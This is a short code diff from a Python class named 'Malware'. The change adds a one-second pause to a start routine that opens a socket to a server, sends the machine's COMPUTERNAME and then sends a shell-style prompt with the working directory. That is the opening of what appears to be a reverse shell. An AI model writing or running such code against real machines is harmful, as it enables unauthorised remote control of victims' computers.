@@ -25,6 +25,7 @@ class Malware(Machine):
     def start(self):
         self.my_socket.connect(self.server_addr)
         self.send(os.environ["COMPUTERNAME"])
+        time.sleep(1)
         self.send(os.getcwd() + "> ")
 
     def send(self, message):
